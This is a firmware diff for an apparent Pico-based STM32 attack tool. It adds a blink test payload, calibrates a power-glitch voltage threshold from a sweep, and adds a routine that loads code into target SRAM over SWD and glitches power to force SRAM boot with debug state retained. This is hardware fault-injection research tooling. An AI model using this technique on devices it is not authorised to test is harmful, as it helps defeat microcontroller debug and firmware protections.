@@ -1,6 +1,7 @@
 #include "config.h"
 #include "uart_cli.h"
 #include "swd.h"
+#include "stm32_pwner.h"
 #include "hardware/uart.h"
 #include "hardware/gpio.h"
 #include "hardware/pwm.h"
@@ -8,6 +9,65 @@
 #include "pico/stdlib.h"
 #include <string.h>
 #include <stdio.h>
+
+// STM32F103 blink payload — blinks PA5 (LD2 on Nucleo-F103RB)
+// 608 bytes: vector table + 252-NOP sled + debug-aware blink code
+// FAST blink (~100ms) = C_DEBUGEN clear (debug domain POR'd)
+// SLOW blink (~500ms) = C_DEBUGEN set (debug domain survived)
+// Auto-generated from stm32_payloads/f1/led_payload.S
+static const uint8_t f103_led_payload[] = {
+  0x00, 0x50, 0x00, 0x20, 0x09, 0x00, 0x00, 0x20, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf,
+  0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x00, 0xbf, 0x11, 0x48, 0x01, 0x68,
+  0x51, 0xf0, 0x04, 0x01, 0x01, 0x60, 0x64, 0x22, 0x01, 0x3a, 0xfd, 0xd1,
+  0x0e, 0x48, 0x01, 0x68, 0x21, 0xf4, 0x70, 0x01, 0x41, 0xf4, 0x00, 0x11,
+  0x01, 0x60, 0x0c, 0x48, 0x01, 0x68, 0x11, 0xf0, 0x01, 0x0f, 0x0c, 0xbf,
+  0x0a, 0x4d, 0x0b, 0x4d, 0x0b, 0x4c, 0x20, 0x20, 0x20, 0x60, 0x2a, 0x46,
+  0x01, 0x3a, 0xfd, 0xd1, 0x4f, 0xf4, 0x00, 0x10, 0x20, 0x60, 0x2a, 0x46,
+  0x01, 0x3a, 0xfd, 0xd1, 0xf3, 0xe7, 0x00, 0x00, 0x18, 0x10, 0x02, 0x40,
+  0x00, 0x08, 0x01, 0x40, 0xf0, 0xed, 0x00, 0xe0, 0x80, 0x38, 0x01, 0x00,
+  0x80, 0x1a, 0x06, 0x00, 0x10, 0x08, 0x01, 0x40
+};
 
 // Hardware UART for target (UART1)
 #define TARGET_UART_ID uart1
@@ -730,6 +790,11 @@ bool target_power_get_state(void) {
 #define SRAM_TEST_WORDS 256
 #define SRAM_TEST_PATTERN 0xDEAD0000u
 
+// Sweep-derived glitch parameters (set by TARGET POWER SWEEP)
+// Optimal threshold: highest sweep threshold where BOR triggered AND SRAM survived
+static float sweep_optimal_thresh = 0;
+static bool sweep_calibrated = false;
+
 static void adc_power_init(void) {
     adc_init();
     adc_gpio_init(ADC_POWER_PIN);
@@ -1172,6 +1237,25 @@ void target_power_sweep(void) {
         uart_cli_send("\r\nBOR not triggered during sweep\r\n");
     }
 
+    // Derive optimal glitch threshold from sweep results
+    // Find the lowest sweep threshold where BOR triggered AND SRAM fully survived
+    // This is the sweet spot: deep enough for BOR, shallow enough for SRAM
+    {
+        float best = 0;
+        for (uint32_t i = 0; i < result_count; i++) {
+            if (results[i].nrst && results[i].good == SRAM_TEST_WORDS) {
+                float v = results[i].thresh * 3.3f / 4095.0f;
+                if (best == 0 || v < best) best = v;
+            }
+        }
+        if (best > 0) {
+            sweep_optimal_thresh = best;
+            sweep_calibrated = true;
+            uart_cli_printf("\r\nCalibration saved: optimal threshold=%.2fV\r\n",
+                            sweep_optimal_thresh);
+        }
+    }
+
     // Ensure power is restored and reset pin back to normal
     gpio_set_mask(POWER_MASK);
     gpio_init(reset_pin);
@@ -1306,4 +1390,177 @@ void target_power_glitch(float voltage, uint32_t count) {
     gpio_put(reset_pin, reset_active_high ? 0 : 1);
 
     uart_cli_send("Glitch test complete, power restored\r\n");
+}
+
+// Upload payload to SRAM, set BOOT0/BOOT1 for SRAM boot, power glitch to reset
+void target_power_payload(float voltage, uint32_t max_attempts) {
+    extern bool swd_connect(void);
+    extern bool swd_halt(void);
+    extern void swd_init(void);
+    extern void swd_deinit(void);
+    extern uint32_t swd_write_mem(uint32_t addr, const uint32_t *data, uint32_t count);
+    extern uint32_t swd_read_mem(uint32_t addr, uint32_t *data, uint32_t count);
+
+    const stm32_target_info_t *info = ensure_target_type();
+    if (!info)
+        return;
+
+    uint32_t sram_base = info->sram_base;
+
+    // Payload size in 32-bit words (round up)
+    uint32_t payload_words = (sizeof(f103_led_payload) + 3) / 4;
+
+    uart_cli_printf("SRAM payload: %u bytes (%lu words) -> 0x%08lX\r\n",
+                    (unsigned)sizeof(f103_led_payload), payload_words, sram_base);
+
+    // Step 1: Upload payload to SRAM via SWD
+    uart_cli_send("[1] Uploading payload to SRAM...\r\n");
+    swd_init();
+    if (!swd_connect()) {
+        swd_deinit();
+        uart_cli_send("ERROR: SWD connect failed\r\n");
+        return;
+    }
+    swd_halt();
+
+    uint32_t written = swd_write_mem(sram_base, (const uint32_t *)f103_led_payload, payload_words);
+    if (written != payload_words) {
+        uart_cli_printf("ERROR: SRAM write failed (%lu/%lu words)\r\n", written, payload_words);
+        swd_deinit();
+        return;
+    }
+
+    // Verify write
+    uint32_t readback[payload_words];
+    uint32_t nread = swd_read_mem(sram_base, readback, payload_words);
+    if (nread != payload_words || memcmp(readback, f103_led_payload, sizeof(f103_led_payload)) != 0) {
+        uart_cli_send("ERROR: SRAM verify failed\r\n");
+        swd_deinit();
+        return;
+    }
+    uart_cli_send("    Payload uploaded and verified\r\n");
+
+    // Resume core before floating SWD — C_HALT persists through system reset
+    // so nRST alone won't unhalt. Must clear it via SWD first.
+    swd_resume();
+    swd_deinit();
+
+    // Step 2: Set BOOT0=1, BOOT1=1 for SRAM boot mode
+    // Drive GPIOs directly — stm32_pwner_set_boot1() triggers full module init
+    // which reinitializes power pin (GP10) as single output, breaking 3-pin gang
+    #define BOOT0_PIN 13  // GP13
+    #define BOOT1_PIN 14  // GP14
+    uart_cli_send("[2] Setting BOOT0=HIGH, BOOT1=HIGH (SRAM boot mode)\r\n");
+    gpio_init(BOOT0_PIN);
+    gpio_set_dir(BOOT0_PIN, GPIO_OUT);
+    gpio_put(BOOT0_PIN, 1);
+    gpio_init(BOOT1_PIN);
+    gpio_set_dir(BOOT1_PIN, GPIO_OUT);
+    gpio_put(BOOT1_PIN, 1);
+
+    // Step 3: Power glitch to trigger POR — boots from SRAM with BOOT0=1, BOOT1=1
+    // Use sweep calibration if available, otherwise use provided/default values
+    float thresh_v = voltage;
+    if (sweep_calibrated) {
+        thresh_v = sweep_optimal_thresh;
+        uart_cli_printf("[3] Power glitch (sweep calibrated: %.2fV, max %lu attempts)...\r\n",
+                        thresh_v, max_attempts);
+    } else {
+        uart_cli_printf("[3] Power glitch (default: %.2fV, max %lu attempts)...\r\n",
+                        thresh_v, max_attempts);
+        uart_cli_send("    (Run TARGET POWER SWEEP first for auto-calibration)\r\n");
+    }
+
+    // Ensure power pins are fully HIGH before glitching
+    gpio_set_mask(POWER_MASK);
+    sleep_ms(50);
+
+    // Configure nRST as input with pull-up so we can detect BOR
+    gpio_init(reset_pin);
+    gpio_set_dir(reset_pin, GPIO_IN);
+    gpio_pull_up(reset_pin);
+
+    adc_power_init();
+    uint32_t thresh = (uint32_t)(thresh_v / 3.3f * 4095.0f);
+
+    bool success = false;
+    uint16_t adc_log[256];
+    uint32_t adc_log_count = 0;
+    glitch_result_t gr;
+
+    for (uint32_t attempt = 1; attempt <= max_attempts; attempt++) {
+        // Custom glitch: ADC-controlled discharge + hold for debug POR latch
+        nrst_irq_arm();
+
+        gpio_set_dir(POWER_PIN2, GPIO_IN);
+        gpio_set_dir(POWER_PIN3, GPIO_IN);
+        gpio_disable_pulls(POWER_PIN2);
+        gpio_disable_pulls(POWER_PIN3);
+
+        adc_select_input(ADC_POWER_CHAN);
+        gr.vmin_raw = 4095;
+        gr.nrst_went_low = false;
+        gr.thresh_reached = true;
+
+        uint64_t t0 = time_us_64();
+        gpio_clr_mask(1u << POWER_PIN1);
+
+        // ADC-controlled discharge to sweep-calibrated threshold
+        while (true) {
+            uint16_t val = adc_read();
+            if (val < gr.vmin_raw) gr.vmin_raw = val;
+            if (val <= thresh) break;
+            if (time_us_64() - t0 > 500000) { gr.thresh_reached = false; break; }
+        }
+
+        // Hold for debug domain POR latch (~50us)
+        if (gr.thresh_reached) {
+            sleep_us(50);
+            uint16_t val = adc_read();
+            if (val < gr.vmin_raw) gr.vmin_raw = val;
+        }
+
+        // Restore power
+        gpio_set_dir(POWER_PIN2, GPIO_OUT);
+        gpio_set_dir(POWER_PIN3, GPIO_OUT);
+        gpio_set_mask(POWER_MASK);
+        gr.glitch_us = (uint32_t)(time_us_64() - t0);
+
+        // Monitor nRST for 50ms
+        for (int i = 0; i < 5000; i++) {
+            if (!gpio_get(reset_pin)) { gr.nrst_went_low = true; break; }
+            sleep_us(10);
+        }
+        nrst_irq_disarm();
+        if (!gr.nrst_went_low && nrst_irq_fired) gr.nrst_went_low = true;
+
+        float vmin = gr.vmin_raw * 3.3f / 4095.0f;
+        uart_cli_printf("  [%lu] Vmin=%.2fV glitch=%luus nRST=%s\r\n",
+                        attempt, vmin, gr.glitch_us,
+                        gr.nrst_went_low ? "LOW" : "high");
+
+        if (gr.nrst_went_low) {
+            uart_cli_send("    BOR + POR latch — target should boot from SRAM\r\n");
+            success = true;
+            break;
+        }
+
+        // Re-stabilize power between attempts
+        gpio_set_mask(POWER_MASK);
+        sleep_ms(200);
+    }
+
+    // Ensure power is back on
+    gpio_set_mask(POWER_MASK);
+
+    if (success) {
+        uart_cli_send("\r\nSUCCESS: Glitch triggered BOR with SRAM intact\r\n");
+        uart_cli_send("BOOT0=HIGH, BOOT1=HIGH — target running from SRAM\r\n");
+    } else {
+        uart_cli_send("\r\nFAILED: Could not trigger BOR with intact SRAM\r\n");
+        uart_cli_send("Try a higher voltage threshold to preserve SRAM\r\n");
+        // Restore boot pins
+        gpio_put(BOOT0_PIN, 0);
+        gpio_put(BOOT1_PIN, 0);
+    }
 }
